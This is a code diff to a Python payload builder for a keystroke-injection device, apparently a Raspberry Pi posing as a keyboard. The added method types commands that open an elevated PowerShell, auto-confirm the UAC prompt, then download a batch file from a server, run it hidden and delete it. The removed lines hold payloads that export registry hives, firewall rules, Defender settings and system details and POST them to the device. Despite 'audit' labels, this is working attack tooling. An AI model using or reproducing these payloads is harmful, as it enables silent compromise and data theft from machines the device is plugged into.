@@ -30,6 +30,19 @@ class PayloadBuilder:
                 }
             }
     
+    def _get_bat_payload_commands(self, bat_filename):
+        return [
+            {'action': 'combo', 'keys': ['WIN', 'r']},
+            {'action': 'delay', 'ms': 500},
+            {'action': 'type', 'text': 'powershell'},
+            {'action': 'combo', 'keys': ['CTRL', 'SHIFT', 'ENTER']},
+            {'action': 'delay', 'ms': 6000},
+            {'action': 'combo', 'keys': ['ALT', 'y']},
+            {'action': 'delay', 'ms': 7000},
+            {'action': 'type', 'text': f'Invoke-WebRequest -Uri "http://{{{{SERVER_IP}}}}/payloads/{bat_filename}" -OutFile "$env:TEMP\\p.bat" -UseBasicParsing; Start-Process -Wait -WindowStyle Hidden -FilePath "$env:TEMP\\p.bat"; rm "$env:TEMP\\p.bat"; exit'},
+            {'action': 'key', 'name': 'ENTER'},
+        ]
+
     def _register_default_payloads(self):
         """Register built-in payload templates"""
         
@@ -37,351 +50,97 @@ class PayloadBuilder:
         self.payloads['sysinfo'] = {
             'name': 'System Information Collector',
             'description': 'Collects Windows system information',
-            'commands': [
-                {'action': 'combo', 'keys': ['WIN', 'r']},
-                {'action': 'delay', 'ms': 500},
-                {'action': 'type', 'text': 'powershell'},
-                {'action': 'key', 'name': 'ENTER'},
-                {'action': 'delay', 'ms': 2000},
-                {'action': 'type', 'text': '$data=@{hostname=$env:COMPUTERNAME;user=$env:USERNAME;os=(Get-WmiObject Win32_OperatingSystem).Caption};'},
-                {'action': 'type', 'text': 'Invoke-RestMethod -Uri "http://{{SERVER_IP}}/check" -Method POST -Body ($data|ConvertTo-Json) -ContentType "application/json"; $data | ConvertTo-Json -Depth 2 | Out-File -FilePath C:\\audit_sysinfo.json -Encoding ascii'},
-                {'action': 'key', 'name': 'ENTER'},
-                {'action': 'delay', 'ms': 1000},
-                {'action': 'type', 'text': 'Invoke-WebRequest -Uri "http://{{SERVER_IP}}:{{UPLOAD_PORT}}" -Method POST -InFile C:\\audit_sysinfo.json -Headers @{"X-Filename"="audit_sysinfo.json"} -UseBasicParsing'},
-                {'action': 'key', 'name': 'ENTER'},
-                {'action': 'delay', 'ms': 1000},
-                {'action': 'delay', 'ms': 1000},
-                {'action': 'type', 'text': 'exit'},
-                {'action': 'key', 'name': 'ENTER'},
-            ]
+            'commands': self._get_bat_payload_commands('sysinfo.bat')
         }
         
         # Compliance check payload
         self.payloads['compliance'] = {
             'name': 'Compliance Check',
             'description': 'Checks security compliance and reports',
-            'commands': [
-                {'action': 'combo', 'keys': ['WIN', 'r']},
-                {'action': 'delay', 'ms': 500},
-                {'action': 'type', 'text': 'powershell -WindowStyle Hidden'},
-                {'action': 'key', 'name': 'ENTER'},
-                {'action': 'delay', 'ms': 2000},
-                {'action': 'type', 'text': '$fw=(Get-NetFirewallProfile -Profile Domain).Enabled;'},
-                {'action': 'type', 'text': '$av=(Get-MpComputerStatus).AntivirusEnabled;'},
-                {'action': 'type', 'text': '$data=@{hostname=$env:COMPUTERNAME;firewall_enabled=$fw;antivirus_updated=$av;timestamp="{{TIMESTAMP}}"};'},
-                {'action': 'type', 'text': 'Invoke-RestMethod -Uri "http://{{SERVER_IP}}/check" -Method POST -Body ($data|ConvertTo-Json) -ContentType "application/json"'},
-                {'action': 'key', 'name': 'ENTER'},
-                {'action': 'delay', 'ms': 2000},
-                {'action': 'type', 'text': 'exit'},
-                {'action': 'key', 'name': 'ENTER'},
-            ]
+            'commands': self._get_bat_payload_commands('compliance.bat')
         }
         
         # Simple test payload
         self.payloads['test'] = {
             'name': 'Test Payload',
             'description': 'Opens notepad with test message',
-            'commands': [
-                {'action': 'combo', 'keys': ['WIN', 'r']},
-                {'action': 'delay', 'ms': 400},
-                {'action': 'type', 'text': 'notepad'},
-                {'action': 'key', 'name': 'ENTER'},
-                {'action': 'delay', 'ms': 1000},
-                {'action': 'type', 'text': 'Security Audit - {{TIMESTAMP}}'},
-                {'action': 'key', 'name': 'ENTER'},
-                {'action': 'type', 'text': 'Host: {{HOST_ID}}'},
-            ]
+            'commands': self._get_bat_payload_commands('test.bat')
         }
         
         # Registry export - Policies (Works on Home)
         self.payloads['export_policies'] = {
             'name': 'Export Registry Policies',
             'description': 'Exports HKLM Policies and uploads to Pi',
-            'commands': [
-                {'action': 'combo', 'keys': ['WIN', 'r']},
-                {'action': 'delay', 'ms': 500},
-                {'action': 'type', 'text': 'powershell'},
-                {'action': 'combo', 'keys': ['CTRL', 'SHIFT', 'ENTER']},
-                {'action': 'delay', 'ms': 6000},
-                {'action': 'combo', 'keys': ['ALT', 'y']},
-                {'action': 'delay', 'ms': 7000},
-                {'action': 'type', 'text': 'reg export HKLM\\Software\\Policies C:\\t.reg /y; Get-Content C:\\t.reg | Out-File C:\\audit_hklm_policies.txt -Encoding ascii; rm C:\\t.reg;'},
-                {'action': 'type', 'text': 'Invoke-WebRequest -Uri "http://{{SERVER_IP}}:{{UPLOAD_PORT}}" -Method POST -InFile C:\\audit_hklm_policies.txt -Headers @{"X-Filename"="audit_hklm_policies.txt"} -UseBasicParsing'},
-                {'action': 'key', 'name': 'ENTER'},
-                {'action': 'delay', 'ms': 2000},
-                {'action': 'type', 'text': 'exit'},
-                {'action': 'key', 'name': 'ENTER'},
-            ]
+            'commands': self._get_bat_payload_commands('export_policies.bat')
         }
         
         self.payloads['export_user_policies'] = {
             'name': 'Export User Policies',
             'description': 'Exports HKCU Policies and uploads to Pi',
-            'commands': [
-                {'action': 'combo', 'keys': ['WIN', 'r']},
-                {'action': 'delay', 'ms': 500},
-                {'action': 'type', 'text': 'powershell'},
-                {'action': 'combo', 'keys': ['CTRL', 'SHIFT', 'ENTER']},
-                {'action': 'delay', 'ms': 6000},
-                {'action': 'combo', 'keys': ['ALT', 'y']},
-                {'action': 'delay', 'ms': 7000},
-                {'action': 'type', 'text': 'reg export HKCU\\Software\\Policies C:\\t.reg /y; Get-Content C:\\t.reg | Out-File C:\\audit_hkcu_policies.txt -Encoding ascii; rm C:\\t.reg;'},
-                {'action': 'type', 'text': 'Invoke-WebRequest -Uri "http://{{SERVER_IP}}:{{UPLOAD_PORT}}" -Method POST -InFile C:\\audit_hkcu_policies.txt -Headers @{"X-Filename"="audit_hkcu_policies.txt"} -UseBasicParsing'},
-                {'action': 'key', 'name': 'ENTER'},
-                {'action': 'delay', 'ms': 2000},
-                {'action': 'type', 'text': 'exit'},
-                {'action': 'key', 'name': 'ENTER'},
-            ]
+            'commands': self._get_bat_payload_commands('export_user_policies.bat')
         }
         
         # Registry export - Services (Works on Home)
         self.payloads['export_services'] = {
             'name': 'Export Services Registry',
             'description': 'Exports Services and uploads to Pi',
-            'commands': [
-                {'action': 'combo', 'keys': ['WIN', 'r']},
-                {'action': 'delay', 'ms': 500},
-                {'action': 'type', 'text': 'powershell'},
-                {'action': 'combo', 'keys': ['CTRL', 'SHIFT', 'ENTER']},
-                {'action': 'delay', 'ms': 6000},
-                {'action': 'combo', 'keys': ['ALT', 'y']},
-                {'action': 'delay', 'ms': 7000},
-                {'action': 'type', 'text': 'reg export HKLM\\SYSTEM\\CurrentControlSet\\Services C:\\t.reg /y; Get-Content C:\\t.reg | Out-File C:\\audit_services.txt -Encoding ascii; rm C:\\t.reg;'},
-                {'action': 'type', 'text': 'Invoke-WebRequest -Uri "http://{{SERVER_IP}}:{{UPLOAD_PORT}}" -Method POST -InFile C:\\audit_services.txt -Headers @{"X-Filename"="audit_services.txt"} -UseBasicParsing'},
-                {'action': 'key', 'name': 'ENTER'},
-                {'action': 'delay', 'ms': 5000},
-                {'action': 'type', 'text': 'exit'},
-                {'action': 'key', 'name': 'ENTER'},
-            ]
+            'commands': self._get_bat_payload_commands('export_services.bat')
         }
         
         # Registry export - Control (Works on Home)
         self.payloads['export_control'] = {
             'name': 'Export Control Registry',
             'description': 'Exports Control and uploads to Pi',
-            'commands': [
-                {'action': 'combo', 'keys': ['WIN', 'r']},
-                {'action': 'delay', 'ms': 500},
-                {'action': 'type', 'text': 'powershell'},
-                {'action': 'combo', 'keys': ['CTRL', 'SHIFT', 'ENTER']},
-                {'action': 'delay', 'ms': 6000},
-                {'action': 'combo', 'keys': ['ALT', 'y']},
-                {'action': 'delay', 'ms': 7000},
-                {'action': 'type', 'text': 'reg export HKLM\\SYSTEM\\CurrentControlSet\\Control C:\\t.reg /y; Get-Content C:\\t.reg | Out-File C:\\audit_control.txt -Encoding ascii; rm C:\\t.reg;'},
-                {'action': 'type', 'text': 'Invoke-WebRequest -Uri "http://{{SERVER_IP}}:{{UPLOAD_PORT}}" -Method POST -InFile C:\\audit_control.txt -Headers @{"X-Filename"="audit_control.txt"} -UseBasicParsing'},
-                {'action': 'key', 'name': 'ENTER'},
-                {'action': 'delay', 'ms': 5000},
-                {'action': 'type', 'text': 'exit'},
-                {'action': 'key', 'name': 'ENTER'},
-            ]
+            'commands': self._get_bat_payload_commands('export_control.bat')
         }
         
         # Firewall export (Works on Home)
         self.payloads['export_firewall'] = {
             'name': 'Export Firewall Config',
             'description': 'Exports firewall and uploads to Pi',
-            'commands': [
-                {'action': 'combo', 'keys': ['WIN', 'r']},
-                {'action': 'delay', 'ms': 500},
-                {'action': 'type', 'text': 'powershell'},
-                {'action': 'combo', 'keys': ['CTRL', 'SHIFT', 'ENTER']},
-                {'action': 'delay', 'ms': 6000},
-                {'action': 'combo', 'keys': ['ALT', 'y']},
-                {'action': 'delay', 'ms': 7000},
-                {'action': 'type', 'text': 'netsh advfirewall firewall show rule name=all | Out-File -FilePath C:\\audit_firewall.txt -Encoding ascii;'},
-                {'action': 'delay', 'ms': 1000},
-                {'action': 'type', 'text': 'Invoke-WebRequest -Uri "http://{{SERVER_IP}}:{{UPLOAD_PORT}}" -Method POST -InFile C:\\audit_firewall.txt -Headers @{"X-Filename"="audit_firewall.txt"} -UseBasicParsing'},
-                {'action': 'key', 'name': 'ENTER'},
-                {'action': 'delay', 'ms': 2000},
-                {'action': 'type', 'text': 'exit'},
-                {'action': 'key', 'name': 'ENTER'},
-            ]
+            'commands': self._get_bat_payload_commands('export_firewall.bat')
         }
         
         # Defender settings (Works on Home)
         self.payloads['export_defender'] = {
             'name': 'Export Defender Settings',
             'description': 'Exports Defender and uploads to Pi',
-            'commands': [
-                {'action': 'combo', 'keys': ['WIN', 'r']},
-                {'action': 'delay', 'ms': 500},
-                {'action': 'type', 'text': 'powershell'},
-                {'action': 'combo', 'keys': ['CTRL', 'SHIFT', 'ENTER']},
-                {'action': 'delay', 'ms': 6000},
-                {'action': 'combo', 'keys': ['ALT', 'y']},
-                {'action': 'delay', 'ms': 7000},
-                {'action': 'type', 'text': 'Get-MpPreference | ConvertTo-Json -Depth 5 | Out-File -FilePath C:\\audit_defender.json -Encoding ascii;'},
-                {'action': 'delay', 'ms': 1000},
-                {'action': 'type', 'text': 'Invoke-WebRequest -Uri "http://{{SERVER_IP}}:{{UPLOAD_PORT}}" -Method POST -InFile C:\\audit_defender.json -Headers @{"X-Filename"="audit_defender.json"} -UseBasicParsing'},
-                {'action': 'key', 'name': 'ENTER'},
-                {'action': 'delay', 'ms': 2000},
-                {'action': 'type', 'text': 'exit'},
-                {'action': 'key', 'name': 'ENTER'},
-            ]
+            'commands': self._get_bat_payload_commands('export_defender.bat')
         }
         
         # Driver enumeration (Works on Home)
         self.payloads['export_drivers'] = {
             'name': 'Export Driver List',
             'description': 'Exports drivers and uploads to Pi',
-            'commands': [
-                {'action': 'combo', 'keys': ['WIN', 'r']},
-                {'action': 'delay', 'ms': 500},
-                {'action': 'type', 'text': 'powershell'},
-                {'action': 'combo', 'keys': ['CTRL', 'SHIFT', 'ENTER']},
-                {'action': 'delay', 'ms': 6000},
-                {'action': 'combo', 'keys': ['ALT', 'y']},
-                {'action': 'delay', 'ms': 7000},
-                {'action': 'type', 'text': 'pnputil /enum-drivers | Out-File -FilePath C:\\audit_drivers.txt -Encoding ascii;'},
-                {'action': 'delay', 'ms': 1000},
-                {'action': 'type', 'text': 'Invoke-WebRequest -Uri "http://{{SERVER_IP}}:{{UPLOAD_PORT}}" -Method POST -InFile C:\\audit_drivers.txt -Headers @{"X-Filename"="audit_drivers.txt"} -UseBasicParsing'},
-                {'action': 'key', 'name': 'ENTER'},
-                {'action': 'delay', 'ms': 5000},
-                {'action': 'type', 'text': 'exit'},
-                {'action': 'key', 'name': 'ENTER'},
-            ]
+            'commands': self._get_bat_payload_commands('export_drivers.bat')
         }
         
         # Device enumeration (Works on Home)
         self.payloads['export_devices'] = {
             'name': 'Export Device List',
             'description': 'Exports devices and uploads to Pi',
-            'commands': [
-                {'action': 'combo', 'keys': ['WIN', 'r']},
-                {'action': 'delay', 'ms': 500},
-                {'action': 'type', 'text': 'powershell'},
-                {'action': 'combo', 'keys': ['CTRL', 'SHIFT', 'ENTER']},
-                {'action': 'delay', 'ms': 6000},
-                {'action': 'combo', 'keys': ['ALT', 'y']},
-                {'action': 'delay', 'ms': 7000},
-                {'action': 'type', 'text': 'pnputil /enum-devices | Out-File -FilePath C:\\audit_devices.txt -Encoding ascii;'},
-                {'action': 'delay', 'ms': 1000},
-                {'action': 'type', 'text': 'Invoke-WebRequest -Uri "http://{{SERVER_IP}}:{{UPLOAD_PORT}}" -Method POST -InFile C:\\audit_devices.txt -Headers @{"X-Filename"="audit_devices.txt"} -UseBasicParsing'},
-                {'action': 'key', 'name': 'ENTER'},
-                {'action': 'delay', 'ms': 5000},
-                {'action': 'type', 'text': 'exit'},
-                {'action': 'key', 'name': 'ENTER'},
-            ]
+            'commands': self._get_bat_payload_commands('export_devices.bat')
         }
         
         # Combined audit (All Home-compatible commands)
         self.payloads['full_audit'] = {
             'name': 'Full System Audit',
             'description': 'Runs all Home-compatible exports (Elevated)',
-            'commands': [
-                {'action': 'combo', 'keys': ['WIN', 'r']},
-                {'action': 'delay', 'ms': 500},
-                {'action': 'type', 'text': 'powershell'},
-                {'action': 'combo', 'keys': ['CTRL', 'SHIFT', 'ENTER']},
-                {'action': 'delay', 'ms': 6000},
-                {'action': 'combo', 'keys': ['ALT', 'y']},
-                {'action': 'delay', 'ms': 7000},
-                {'action': 'type', 'text': '$data=@{hostname=$env:COMPUTERNAME;user=$env:USERNAME;os=(Get-WmiObject Win32_OperatingSystem).Caption}; $data | ConvertTo-Json -Depth 2 | Out-File -FilePath C:\\audit_sysinfo.json -Encoding ascii;'},
-                {'action': 'key', 'name': 'ENTER'},
-                {'action': 'delay', 'ms': 1000},
-                {'action': 'type', 'text': 'reg export HKLM\\Software\\Policies C:\\t.reg /y; Get-Content C:\\t.reg | Out-File C:\\audit_hklm_policies.txt -Encoding ascii; rm C:\\t.reg;'},
-                {'action': 'key', 'name': 'ENTER'},
-                {'action': 'delay', 'ms': 2000},
-                {'action': 'type', 'text': 'reg export HKCU\\Software\\Policies C:\\t.reg /y; Get-Content C:\\t.reg | Out-File C:\\audit_hkcu_policies.txt -Encoding ascii; rm C:\\t.reg;'},
-                {'action': 'key', 'name': 'ENTER'},
-                {'action': 'delay', 'ms': 2000},
-                {'action': 'type', 'text': 'reg export HKLM\\SYSTEM\\CurrentControlSet\\Services C:\\t.reg /y; Get-Content C:\\t.reg | Out-File C:\\audit_services.txt -Encoding ascii; rm C:\\t.reg;'},
-                {'action': 'key', 'name': 'ENTER'},
-                {'action': 'delay', 'ms': 2000},
-                {'action': 'type', 'text': 'reg export HKLM\\SYSTEM\\CurrentControlSet\\Control C:\\t.reg /y; Get-Content C:\\t.reg | Out-File C:\\audit_control.txt -Encoding ascii; rm C:\\t.reg;'},
-                {'action': 'key', 'name': 'ENTER'},
-                {'action': 'delay', 'ms': 2000},
-                {'action': 'type', 'text': 'netsh advfirewall firewall show rule name=all | Out-File -FilePath C:\\audit_firewall.txt -Encoding ascii;'},
-                {'action': 'key', 'name': 'ENTER'},
-                {'action': 'delay', 'ms': 2000},
-                {'action': 'type', 'text': 'Get-MpPreference | ConvertTo-Json -Depth 5 | Out-File -FilePath C:\\audit_defender.json -Encoding ascii;'},
-                {'action': 'key', 'name': 'ENTER'},
-                {'action': 'delay', 'ms': 2000},
-                {'action': 'type', 'text': 'pnputil /enum-drivers | Out-File -FilePath C:\\audit_drivers.txt -Encoding ascii;'},
-                {'action': 'key', 'name': 'ENTER'},
-                {'action': 'delay', 'ms': 2000},
-                {'action': 'type', 'text': 'pnputil /enum-devices | Out-File -FilePath C:\\audit_devices.txt -Encoding ascii;'},
-                {'action': 'key', 'name': 'ENTER'},
-                {'action': 'delay', 'ms': 2000},
-                {'action': 'type', 'text': '$files=@("audit_sysinfo.json","audit_hklm_policies.txt","audit_hkcu_policies.txt","audit_services.txt","audit_control.txt","audit_firewall.txt","audit_defender.json","audit_drivers.txt","audit_devices.txt");'},
-                {'action': 'key', 'name': 'ENTER'},
-                {'action': 'delay', 'ms': 1000},
-                {'action': 'type', 'text': 'foreach($f in $files){$p="C:\\$f";if(Test-Path $p){Invoke-WebRequest -Uri "http://{{SERVER_IP}}:{{UPLOAD_PORT}}" -Method POST -InFile $p -Headers @{"X-Filename"=$f} -UseBasicParsing}}'},
-                {'action': 'key', 'name': 'ENTER'},
-                {'action': 'delay', 'ms': 10000},
-                {'action': 'type', 'text': 'exit'},
-                {'action': 'key', 'name': 'ENTER'},
-            ]
+            'commands': self._get_bat_payload_commands('full_audit.bat')
         }
         
         # Full audit with auto-upload
         self.payloads['audit_and_upload'] = {
             'name': 'Audit and Upload',
             'description': 'Exports all data and uploads to Pi automatically',
-            'commands': [
-                {'action': 'combo', 'keys': ['WIN', 'r']},
-                {'action': 'delay', 'ms': 500},
-                {'action': 'type', 'text': 'powershell'},
-                {'action': 'combo', 'keys': ['CTRL', 'SHIFT', 'ENTER']},
-                {'action': 'delay', 'ms': 6000},
-                {'action': 'combo', 'keys': ['ALT', 'y']},
-                {'action': 'delay', 'ms': 7000},
-                {'action': 'type', 'text': '$data=@{hostname=$env:COMPUTERNAME;user=$env:USERNAME;os=(Get-WmiObject Win32_OperatingSystem).Caption}; $data | ConvertTo-Json -Depth 2 | Out-File -FilePath C:\\audit_sysinfo.json -Encoding ascii;'},
-                {'action': 'key', 'name': 'ENTER'},
-                {'action': 'delay', 'ms': 1000},
-                {'action': 'type', 'text': 'reg export HKLM\\Software\\Policies C:\\t.reg /y; Get-Content C:\\t.reg | Out-File C:\\audit_hklm_policies.txt -Encoding ascii; rm C:\\t.reg;'},
-                {'action': 'key', 'name': 'ENTER'},
-                {'action': 'delay', 'ms': 2000},
-                {'action': 'type', 'text': 'reg export HKCU\\Software\\Policies C:\\t.reg /y; Get-Content C:\\t.reg | Out-File C:\\audit_hkcu_policies.txt -Encoding ascii; rm C:\\t.reg;'},
-                {'action': 'key', 'name': 'ENTER'},
-                {'action': 'delay', 'ms': 2000},
-                {'action': 'type', 'text': 'reg export HKLM\\SYSTEM\\CurrentControlSet\\Services C:\\t.reg /y; Get-Content C:\\t.reg | Out-File C:\\audit_services.txt -Encoding ascii; rm C:\\t.reg;'},
-                {'action': 'key', 'name': 'ENTER'},
-                {'action': 'delay', 'ms': 2000},
-                {'action': 'type', 'text': 'reg export HKLM\\SYSTEM\\CurrentControlSet\\Control C:\\t.reg /y; Get-Content C:\\t.reg | Out-File C:\\audit_control.txt -Encoding ascii; rm C:\\t.reg;'},
-                {'action': 'key', 'name': 'ENTER'},
-                {'action': 'delay', 'ms': 2000},
-                {'action': 'type', 'text': 'netsh advfirewall firewall show rule name=all | Out-File -FilePath C:\\audit_firewall.txt -Encoding ascii;'},
-                {'action': 'key', 'name': 'ENTER'},
-                {'action': 'delay', 'ms': 2000},
-                {'action': 'type', 'text': 'Get-MpPreference | ConvertTo-Json -Depth 5 | Out-File -FilePath C:\\audit_defender.json -Encoding ascii;'},
-                {'action': 'key', 'name': 'ENTER'},
-                {'action': 'delay', 'ms': 2000},
-                {'action': 'type', 'text': 'pnputil /enum-drivers | Out-File -FilePath C:\\audit_drivers.txt -Encoding ascii;'},
-                {'action': 'key', 'name': 'ENTER'},
-                {'action': 'delay', 'ms': 2000},
-                {'action': 'type', 'text': 'pnputil /enum-devices | Out-File -FilePath C:\\audit_devices.txt -Encoding ascii;'},
-                {'action': 'key', 'name': 'ENTER'},
-                {'action': 'delay', 'ms': 2000},
-                {'action': 'type', 'text': '$files=@("audit_sysinfo.json","audit_hklm_policies.txt","audit_hkcu_policies.txt","audit_services.txt","audit_control.txt","audit_firewall.txt","audit_defender.json","audit_drivers.txt","audit_devices.txt");'},
-                {'action': 'key', 'name': 'ENTER'},
-                {'action': 'delay', 'ms': 1000},
-                {'action': 'type', 'text': 'foreach($f in $files){$p="C:\\$f";if(Test-Path $p){Invoke-WebRequest -Uri "http://{{SERVER_IP}}:{{UPLOAD_PORT}}" -Method POST -InFile $p -Headers @{"X-Filename"=$f} -UseBasicParsing}}'},
-                {'action': 'key', 'name': 'ENTER'},
-                {'action': 'delay', 'ms': 10000},
-                {'action': 'type', 'text': 'exit'},
-                {'action': 'key', 'name': 'ENTER'},
-            ]
+            'commands': self._get_bat_payload_commands('audit_and_upload.bat')
         }
         
         # Upload audit files to Pi
         self.payloads['upload_files'] = {
             'name': 'Upload Audit Files',
             'description': 'Uploads all audit files to Pi (Elevated)',
-            'commands': [
-                {'action': 'combo', 'keys': ['WIN', 'r']},
-                {'action': 'delay', 'ms': 500},
-                {'action': 'type', 'text': 'powershell'},
-                {'action': 'combo', 'keys': ['CTRL', 'SHIFT', 'ENTER']},
-                {'action': 'delay', 'ms': 6000},
-                {'action': 'combo', 'keys': ['ALT', 'y']},
-                {'action': 'delay', 'ms': 7000},
-                {'action': 'type', 'text': '$files=@("audit_sysinfo.json","audit_hklm_policies.txt","audit_hkcu_policies.txt","audit_services.txt","audit_control.txt","audit_firewall.txt","audit_defender.json","audit_drivers.txt","audit_devices.txt");foreach($f in $files){$p="C:\\$f";if(Test-Path $p){Invoke-WebRequest -Uri "http://{{SERVER_IP}}:{{UPLOAD_PORT}}" -Method POST -InFile $p -Headers @{"X-Filename"=$f} -UseBasicParsing}}'},
-                {'action': 'key', 'name': 'ENTER'},
-                {'action': 'delay', 'ms': 5000},
-                {'action': 'type', 'text': 'exit'},
-                {'action': 'key', 'name': 'ENTER'},
-            ]
+            'commands': self._get_bat_payload_commands('upload_files.bat')
         }
     
     def get_payload(self, name, variables=None):
